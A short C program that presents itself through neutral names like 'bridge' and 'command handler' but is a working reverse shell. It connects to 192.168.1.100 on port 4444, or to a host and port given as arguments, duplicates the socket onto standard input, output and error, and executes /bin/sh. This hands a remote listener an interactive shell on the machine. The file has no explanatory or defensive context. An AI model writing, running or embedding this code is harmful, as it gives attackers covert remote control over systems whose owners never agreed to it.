#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define DEFAULT_HOST "192.168.1.100"
#define DEFAULT_PORT 4444
#define BUFFER_SIZE 4096

typedef struct {
    const char *host;
    int port;
    int timeout_ms;
} bridge_config_t;

int init_bridge_socket(const char *host, int port) {
    int sockfd;
    struct sockaddr_in server_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        return -1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        perror("invalid address");
        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connection failed");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

int configure_io_streams(int sockfd) {
    if (dup2(sockfd, STDIN_FILENO) < 0) return -1;
    if (dup2(sockfd, STDOUT_FILENO) < 0) return -1;
    if (dup2(sockfd, STDERR_FILENO) < 0) return -1;
    return 0;
}

void launch_command_handler(void) {
    char *args[] = {"/bin/sh", NULL};
    char *env[] = {NULL};
    execve("/bin/sh", args, env);
    perror("execve failed");
    exit(EXIT_FAILURE);
}

int run_bridge(const bridge_config_t *config) {
    int sockfd = init_bridge_socket(config->host, config->port);
    if (sockfd < 0) return EXIT_FAILURE;

    if (configure_io_streams(sockfd) < 0) {
        close(sockfd);
        return EXIT_FAILURE;
    }

    launch_command_handler();
    return EXIT_SUCCESS;
}

int main(int argc, char *argv[]) {
    bridge_config_t config = { .host = DEFAULT_HOST, .port = DEFAULT_PORT, .timeout_ms = 5000 };
    if (argc >= 3) { config.host = argv[1]; config.port = atoi(argv[2]); }
    return run_bridge(&config);
}
